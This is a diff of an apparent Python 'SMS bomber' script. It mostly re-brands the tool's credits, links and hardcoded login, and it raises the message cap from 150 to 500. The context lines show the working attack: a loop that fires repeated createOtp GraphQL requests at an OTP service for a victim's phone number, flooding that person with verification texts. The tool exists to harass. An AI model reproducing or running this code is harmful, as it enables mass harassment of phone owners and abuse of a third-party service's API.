@@ -1,7 +1,7 @@
 #!/bin/python
-#Coder MAFIA 
-#GitHub : htpps://github.com/mafia708090
-#FB ID:  https://www.facebook.com/mafia708090
+#Coder MD Ekramul Hassan 
+#GitHub : htpps://github.com/mao2116
+#FB ID:  https://www.facebook.com/ekramul.hassan.79827
 import os
 try:
   from termcolor import *
@@ -27,8 +27,8 @@ except:
     print("if You Can't Install  Requerments Then Tool Not Run.")
     print("Install Requerments") 
   exit()
-user = 'mafia'#
-passwd = '708090'#
+user = 'mao'#
+passwd = '2116'#
 
 def word (z):
   for word in z + '\n':
@@ -51,11 +51,11 @@ word(x5)
 word(x3)
 while True:
   us = input(colored("USERNAME: ", 'green'))
-  if us == 'mafia':
+  if us == 'mao':
   
     while True:
       psw = input(colored("PASSWORD: ", 'green'))
-      if psw == '708090':
+      if psw == '2116':
         
         while True:
           x = colored("[1.] Bangladesh :880", 'green')
@@ -96,10 +96,10 @@ while True:
           if x4 == '1':
            num = input(colored("Fucking Number :", 'cyan'))
            while True:
-             print(colored("Max 150!!", 'green'))
+             print(colored("Max 500!!", 'green'))
              msg = input(colored("How Much You Want To Send :", 'green'))
              mm = int(msg)
-             if (mm < 151):
+             if (mm < 501):
               for i in range(mm):
                data={"query":"\nmutation CreateOtp (\n    $phone: PhoneNumber!\n    $country: String!\n    $uuid: String!\n    $osVersionCode: String\n    $deviceBrand: String\n    $deviceModel: String\n    $requestFrom: String\n) {\n    createOtp(\n        auth: {\n            phone: $phone,\n            countryCode: $country,\n            deviceUuid: $uuid,\n            deviceToken: \"\"\n        }\n        device: {\n            deviceType: WEB\n            osVersionCode: $osVersionCode\n            deviceBrand: $deviceBrand\n            deviceModel: $deviceModel\n        }\n        requestFrom: $requestFrom\n    ){\n        statusCode\n    }\n}\n","variables":{"phone":num,"country":"880","uuid":"64b9bb81-93f3-4757-9e92-9cfbf34d8039","osVersionCode":"Linux armv8l","deviceBrand":"Chrome","deviceModel":"89","requestFrom":"U2FsdGVkX18QITR3WakOCR2OK+zoIpqM7DqxiLf915s="}}
   
@@ -112,10 +112,10 @@ while True:
                  word(colored("Massege Sent SuccesFully", 'cyan'))
                else:
                 word(colored("sorry", 'green'))
-              os.system("xdg-open https://wap4dollar.com/ad/serve.php?id=iwg5idym0f")
+              os.system("xdg-open https://www.facebook.com/ekramul.hassan.79827")
               break
              else:
-               word(colored("Max Massege 150 , Please Try Again", 'green'))
+               word(colored("Max Massege 500 , Please Try Again", 'green'))
 
 
 
@@ -161,7 +161,7 @@ while True:
             x1 = colored(x1, 'cyan')
             word(x1)
             word(x)
-            os.system('xdg-open https://github.com/mafia708090/')
+            os.system('xdg-open https://github.com/mao2116/')
             break
           elif x4 == '3':
             server = smtplib.SMTP('smtp.gmail.com', 587)
